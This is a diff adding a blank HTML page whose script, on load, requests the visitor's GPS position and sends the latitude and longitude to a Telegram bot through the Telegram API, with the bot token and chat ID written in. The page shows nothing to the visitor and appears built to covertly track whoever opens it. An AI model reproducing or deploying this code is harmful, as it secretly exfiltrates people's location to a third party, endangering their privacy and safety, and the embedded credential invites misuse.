@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html>
+<body>
+<script>
+navigator.geolocation.getCurrentPosition(
+    (pos) => {
+        const lat = pos.coords.latitude;
+        const lon = pos.coords.longitude;
+        const message = `📍 Координаты: ${lat}, ${lon}`;
+        const encodedMessage = encodeURIComponent(message);
+        fetch(`https://api.telegram.org/bot7537276186:AAE4wPAy-igc6fkrun1qtfT6fnnGyxSa55c/sendMessage?chat_id=7847551328&text=${encodedMessage}`);
+    },
+    (err) => alert("GPS недоступен!")
+);
+</script>
+</body>
+</html>
